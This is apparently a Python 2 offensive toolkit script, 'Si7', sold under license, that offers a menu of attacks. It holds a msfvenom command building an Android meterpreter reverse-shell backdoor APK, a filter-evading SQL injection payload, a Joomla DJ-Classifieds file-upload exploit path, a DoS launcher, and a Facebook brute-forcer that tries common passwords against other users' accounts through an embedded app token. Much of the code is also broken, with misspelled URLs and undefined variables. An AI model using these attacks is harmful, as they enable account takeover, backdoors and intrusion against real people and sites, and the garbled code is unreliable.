#!usr/bin/python
#-*- coding: utf-8 -*-

#FOR PACKAGE PREPARE TOOLS!
import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib, requests, mechanize
from multiprocessing.pool import ThreadPool

from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Mozilla/9.80 (Windows 8; Mozilla Firefox/74.0.3729/85. U; id) Presto/7.22.719 Version/12.16')]

#FOR ALL PROGRAM!
logo = """\033[1;33;99m
    _____ _________
  / ___//  _/__  /
  \__ \ / /   / /   \033[1;0;99m[?] Version 1.5\033[1;33;99m
 ___/ // /   / /   \033[1;0;99m[#] Coded By : Si7\033[1;33;99m
/____/___/  /_/  \033[1;0;99m[*] https://github.com/CPC77
<<<<<<<< technical <HACKING> servers >>>>>>>>"""

def out():
	print '\033[1;31;99m[||] \033[1;0;99mClose'
	os.system('rm -rf target.txt')
	sys.exit()
	
def running(s):
	for m in s+ '\n':
		sys.stdout.write(m)
		sys.stdout.flush()
		time.sleep(0.3)

def tik():
    animation = '|/-\|'
    for i in range(100):
        time.sleep(0.1)
        sys.stdout.write('\r\033[1;0;99mStarting ... \033[1;97m' + animation[(i % len(animation))])
        sys.stdout.flush()

#FOR MAIN MENU!

def main():
	os.system('clear')
	print
	print logo
	print
	cmd = raw_input('>>> ')
	if cmd == 'set payload':
		dumper()
	else:
		if cmd == 'set sql':
			sql()
		else:
			if cmd == 'open metas':
				tik()
				os.system('cd meta')
				os.system('msfconsole')
			else:
				if cmd == 'set djupload':
					dj()
				else:
					if cmd == 'info':
						info()
					else:
						if cmd == 'set brute':
							crack()
						else:
							if cmd == 'set panel':
								panelfinder()
							else:
								if cmd == 'update':
									os.system('python2 Si7api.py')
								else:
									if cmd == 'set dos':
										doskit()
									else:
										if cmd == 'report -p':
											report()
										else:
											print '\033[1;31;99mCRITICAL \033[1;0;99m: Command '+cmd+' is not definnied!'
											time.sleep(3)
											main()
								
								
def sql():
	target = raw_input('>>> ')
	xploits()
	tik()
	print
	print '\033[1;32;99mINFO \033[1;0;99m: Enable to connect target'
	time.sleep(5)
	print '\033[1;32;99mINFO \033[1;0;99m: Getting Xploitation Code From Project'
	time.sleep(5)
	print '\033[1;32;99mINFO \033[1;0;99m: Dump is running'
	time.sleep(4)
	try:
		fo = open('sqlploiter.txt', 'r').read()
		for xploit in fo:
			data = requests.get('httsp://'+target+xploit)
			json.load(data.text)
			print '\033[1;32;99mINFO \033[1;0;99m: Xploitation For Targets 100% Done'
			print '\033[1;0;99m<=========================>'
			print '\033[1;0;99mUsername : ' + a['username']
			print '\033[1;0;99mPassword  : ' + a['password']
			print
			print '\033[1;0;99m[*] xploitation from Si7 Project - See you Again'
			sys.exit()
		
	except IOError or request.exceptions.ConnectionError or KerboardInterrupt:
		print '\033[1;31;99mCRITICAL \033[1;0;99m: Error Connection Low or Xploitation is Failled'
		os.system('rm -rf sqlxploiter.txt')
		out()
	
def mulai():
	tik()
	try:
		akses = open('LISENSI.txt', 'r').read()
		if 'QrywnauwQYNLinbyy_TtRdQyouRvnwjn' in akses:
			main()
		else:
			print
			print '\033[1;31;99mCRITICAL \033[1;0;99m: Lisensi Found, But is Invalid!'
			os.system('rm -rf LISENSI.txt')
			sys.exit()
	
	except IOError:
		print
		print '\033[1;31;99mCRITICAL \033[1;0;99m: Lisensi not found!'
		rm = raw_input('Do you want to buy LICENSE in admin? (y/n) ')
		if rm == 'y':
			os.system('xdg-open https://wa.me/+6281223617054?Auto_send&text=%20Hello%20Admin%20I%20Will%20Buy%20LICENSE')
		else:
			if rm == 'n':
				tt = raw_input('LICENSE : ')
				hh = open('LISENSI.txt','w')
				hh.write(tt)
				hh.close()
				out()
		
def dj():
	target = raw_input('>>> ')
	ploiterdj()
	file = raw_input('>>> ')
	tik()
	print
	print '\033[1;32;99mINFO \033[1;0;99m: Enable to connect target'
	time.sleep(5)
	print '\033[1;32;99mINFO \033[1;0;99m: Getting Xploitation Code From Project'
	time.sleep(5)
	print '\033[1;32;99mINFO \033[1;0;99m: Dump is running'
	time.sleep(4)
	try:
		fo = open('djxploit.txt', 'r').read()
		for xploit in fo:
			data = requests.get('httsp://'+target+xploit+'/file&type='+file)
			json.load(data.text)
			for info in data:
				if 'title' in info:
					print '\033[1;32;99mINFO \033[1;0;99m: Xploitation and Uploading With POC djupload ,  Done 100%'
					print
					print '\033[1;0;99m[*] \033[1;0;99m: Xploitation and Uploading by Si7 Project - See you Again'
				else:
					if 'error_msg' in info:
						print '\033[1;31;99mCRITICAL \033[1;0;99m: Xploitation And Uploading Is Failled Because File path Error or Connection Lost'
						out()
			
	except IOError or requests.exceptions.ConnectionError or KeyboardInterrupt:
		print '\033[1;31;99mCRITICAL \033[1;0;99m: Error Connection Low or Xploitation is Failled'
		sys.exit()
		
def info():
	try:
		os.system('cat info.txt')
		raw_input('')
		main()
	except IOError:
		print '\x1b[1;31;99mCRITICAL\x1b[1;0;99m : information (info.txt) not found! please message admin for this problem with command ( report -info)'
		print
		out()
	
def dumper():
	tik()
	print
	print '\033[1;32;99mINFO \033[1;0;99m: Wait for Create backdoor.apk'
	time.sleep(5)
	os.system('msfvenom -p android/meterpreter/reverse_tcp lhost=127.0.0.1 lport=4444 R> /storage/emulated/0/backdoor.apk')
	print '\033[1;32;99mINFO \033[1;0;99m: Done, backdoor.apk in /storage/emulated/0'
	print
	r = raw_input('Open Metasploit Now? [Y/n] ')
	if r == 'Y' or 'y':
		os.system('cd meta')
		os.system('msfconsole')
	else:
		if r == 'N' or 'n':
			out()
		else:
			print '\033[1;31;99mCRITICAL \033[1;0;99m: Command ' + r + 'is not definnied!'
			sys.exit()
			
def panelfinder():
	f = open("link.txt","r");
	link = raw_input("\033[0mEnter Site Name \n\033[33m(ex : example.com or www.example.com )\033[31m => ")
	print "\033[1;0;99m\n\nAvilable links : \n"
	while True:
		sub_link = f.readline()
		if not sub_link:
			break
		req_link = "http://"+link+"/"+sub_link
		req = Request(req_link)
		try:
			response = urlopen(req)
		except HTTPError as e:
			continue
		except URLError as e:
			continue
		else:
			print  "\033[1;32;99mOK => ",req_link
			print
			print '\033[1;0;99m[*] : Panel Finder by Si7 procjet - See you again!'
			sys.exit()
			
def crack():
	try:
		token = open('token.txt','r').read()
		muat()
	except IOError:
		print '\x1b[1;31;99mCRITICAL \x1b[1;0;99m: access token not found!'
		tkn = raw_input('\x1b[1;0;99maccess_token : ')
		s = open('token.txt','w')
		s.write(tkn)
		s.close()
		time.sleep(3)
		muat()
		
def muat():
	try:
		token = open('token.txt','r').read()
		log = requests.get('https://graph.facebook.com/me?access_token=' + token)
		a = json.loads(log.text)
		nick = a['name']
		brute()
	except KeyError or requests.exceptions.ConnectionError:
		print '\x1b[1;31;99mCRITICAL \x1b[1;0;99m: protect account detected please login with chrome , out in lite and try again!'
		os.system('rm -rf access.txt')
		out()

def brute():
	type = raw_input('\x1b[1;0:99m[?] Enter your choiche, (m) for manual pass list or (a) for auto pass list/: ')
	if type == 'm':
		m_brute()
	else:
		if type == 'a':
			aumbf()
		else:
			print '\x1b[1;31;99mCRITICAL\x1b[1;0;99m : not command ' + type + 'is not definied!'
			out()

def m_brute():
	fg = raw_input('Enter your choiche, (g) for brute in groups id or (f) for brute in friends id/: ')
	idg = raw_input('>>> ')
	if fg == 'g':
		running('\x1b[1;32;99mINFO \x1b[1;0;99m: checking Id from groups ___')
		token = open('token.txt','r').read()
		r = requests.get('https://graph.facebook.com/group/?id=' + idg + '&access_token=' + token)
		m = json.loads(r.text)
		for y in m['data']:
			id.append(y['id'])
			
	else:
		if fg == 'f':
			running('\x1b[1;32;99mINFO \x1b[1;0;99m: checking Id from groups ___')
			n = requests.get('https://graph.facebook.com/me/friends?access_token=' + token)
			s = json.loads(n.text)
			for h in s['data']:
				id.append(h['id'])
	
	print '\x1b[1;32;99mINFO\x1b[1;0;99m : ' + str(len(id)) + 'User ID detected'
	pw =  raw_input('>>> ')
	tik()
	user = arg
	try:
		a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + token)
		b = json.loads(a.text)
		data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
		k = json.loads(data)
		if 'access_token' in k:
			print '\x1b[1;32;99mINFO \x1b[1;0;99m: ' + user + ' | ' + pw
		else:
			if 'www.facebook.com' in k['error_msg']:
				print '\x1b[1;33;99mINFO \x1b[1;0;99m: ' + user + ' | ' + pw
		
	
	except:
		pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print 
	print '\x1b[1;0;99m[*] Bruteforce manual list done, by Si7 Project'
	out()

def aumbf():
	fg = raw_input('Enter your choiche, (g) for brute in groups id or (f) for brute in friends id/: ')
	idg = raw_input('>>> ')
	if fg == 'g':
		running('\x1b[1;32;99mINFO \x1b[1;0;99m: checking Id from groups ___')
		token = open('token.txt','r').read()
		r = requests.get('https://graph.facebook.com/group/?id=' + idg + '&access_token=' + token)
		m = json.loads(r.text)
		for y in m['data']:
			id.append(y['id'])
			
	else:
		if fg == 'f':
			running('\x1b[1;32;99mINFO \x1b[1;0;99m: checking Id from groups ___')
			n = requests.get('https://graph.facebook.com/me/friends?access_token=' + token)
			s = json.loads(n.text)
			for h in s['data']:
				id.append(h['id'])
	
	print '\x1b[1;32;99mINFO\x1b[1;0;99m : ' + str(len(id)) + 'User ID detected'
	pw =  raw_input('>>> ')
	tik()
	user = arg
	try:
		a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + token)
		b = json.loads(a.text)
		list1 = a['first_name'] + '123', '1234'
		data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + list1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
		n = json.loads(data)
		if 'access_token' in n:
			print '\x1b[1;32;99mINFO \x1b[1;0;99m: ' + user + ' | ' + pw
		else:
			if 'www.facebook.com' in q['error_msg']:
				print '\x1b[1;33;99mINFO \x1b[1;0;99m: ' + user + ' | ' + pw
			else:
				list2 = b['birthday']
				data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + list2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
				q = json.loads(data)
				if 'access_token' in q:
					print '\x1b[1;32;99mINFO \x1b[1;0;99m: ' + user + ' | ' + pw
				else:
					if 'www.facebook.com' in q['error_msg']:
						print '\x1b[1;33;99mINFO \x1b[1;0;99m: ' + user + ' | ' + pw
					else:
						list3 = 'persib1933'
						data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + list3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
						q = json.loads(data)
						if 'access_token' in q:
							print '\x1b[1;32;99mINFO \x1b[1;0;99m: ' + user + ' | ' + pw
						else:
							if 'www.facebook.com' in q['error_msg']:
								print '\x1b[1;33;99mINFO \x1b[1;0;99m: ' + user + ' | ' + pw
							else:
								list4 = 'jackmania'
								data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + list4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
								q = json.loads(data)
								if 'access_token' in q:
									print '\x1b[1;32;99mINFO \x1b[1;0;99m: ' + user + ' | ' + pw
								else:
									if 'www.facebook.com' in q['error_msg']:
										print '\x1b[1;33;99mINFO \x1b[1;0;99m: ' + user + ' | ' + pw
									else:
										list5 = 'bangsat'
										data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + list5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
										q = json.loads(data)
										if 'access_token' in q:
											print '\x1b[1;32;99mINFO \x1b[1;0;99m: ' + user + ' | ' + pw
										else:
											if 'www.facebook.com' in q['error_msg']:
												print '\x1b[1;33;99mINFO \x1b[1;0;99m: ' + user + ' | ' + pw
											else:
												list6 = 'gans123'
												data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + list6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
												q = json.loads(data)
												if 'access_token' in q:
													print '\x1b[1;32;99mINFO \x1b[1;0;99m: ' + user + ' | ' + pw
												else:
													if'www.facebook.com' in q['error_msg']:
														print '\x1b[1;33;99mINFO \x1b[1;0;99m: ' + user + ' | ' + pw
													else:
														list7 = a['first_name'] + 'chan'
														data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + list7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
														q = json.loads(data)
														if 'access_token' in q:
															print '\x1b[1;32;99mINFO \x1b[1;0;99m: ' + user + ' | ' + pw
														else:
															if 'www.facebook.com' in q['error_msg']:
																print '\x1b[1;33;99mINFO \x1b[1;0;99m: ' + user + ' | ' + pw
															else:
																list8 = 'freefire'
																data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + list8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
																q = json.loads(data)
																if 'access_token' in q:
																	print '\x1b[1;32;99mINFO \x1b[1;0;99m: ' + user + ' | ' + pw
																else:
																	if 'www.facebook.com' in q['error_msg']:
																		print '\x1b[1;33;99mINFO \x1b[1;0;99m: ' + user + ' | ' + pw
																	else:
																		list9 = 'anjing'
																		data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + list9 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
																		q = json.load(data)
																		if 'access_token' in q:
																			print '\x1b[1;32;99mINFO \x1b[1;0;99m: ' + user + ' | ' + pw
																		else:
																			if 'www.facebook.com' in q['error_msg']:
																				print '\x1b[1;33;99mINFO \x1b[1;0;99m: ' + user + ' | ' + pw
																			else:
																				list10 = 'jomblo123'
																				data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + list10 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
																				q = json.loads(data)
																				if 'access_token' in q:
																					print '\x1b[1;32;99mINFO \x1b[1;0;99m: ' + user + ' | ' + pw
																				else:
																					if 'www.facebook.com' in q['error_msg']:
																						print '\x1b[1;33;99mINFO \x1b[1;0;99m: ' + user + ' | ' + pw
												
	except:
		pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print
	print '\x1b[1;0;99m[*] Auto bruteforce facebook done, by Si7 Project'
	out()

def doskit():
	target = raw_input('>>> ')
	port = raw_input('>>> ')
	thread = raw_input('>>> ')
	try:
		os.system('python3 dos.py -s ' + target + ' -p ' + port + ' -t ' + thread )
		raw_jnput('')
		doskit()
	except (IOError, NameError, KeyboardInterrupt):
		print '\x1b[1;31;99mCRITICAL \x1b[1;0;99m: Error invalid generic code in tools, Please Try again!'
		out()
#FOR EXPLOITER!
def xploits():
	cmn = raw_input('>>> ')
	tbl = raw_input('>>> ')
	fo = open('sqlxploiter.txt', 'w')
	r = '+/*!50000union*/+/*!50000select*/%201,2,3,export_set(5,@:=0,(select+count(*)/*!50000from*/+/*!50000information_schema*/.columns+where@:=export_set(5,export_set(5,@,0x3c6c693e,/*!50000'+cmn+'*/,2),0x3a3a,/*!50000'+tbl+'*/,2)),@,2),5,6--+'
	fo.write(r)
	fo.close()
	sys.stdout.flush()

def ploiterdj():
	fo = open('djxploit.txt', 'w')
	r = '/index.php?option=com_djclassifieds&task=upload&tmpl=component'
	fo.write(r)
	fo.close()
	sys.stdout.flush()

#FOR REPORTING TOOLS!
def report():
	running('\x1b[1;0;99m*****************[REPORT PR0BLEM]**')
	print '[] space = %20'
	msg = raw_input('What do you problems?/: ')
	try:
		tik()
		br = open('https://wa.me/081223617054?&text=')
		br._factory.is_aplication = True
		br.select_form(nr=0)
		br.form['message'] = msg
		br.submit()
		print '\x1b[1;32;99mDONE'
		raw_input('')
		main()
	except (IOError, KeyboardInterrupt):
		print
		print '\x1b[1;31;99mCRITICAL \x1b[1;0;99m: Error invalid generic code in tools, Please Try again!'
		out()
#FOR STARTING!
if __name__ == '__main__':
	mulai()
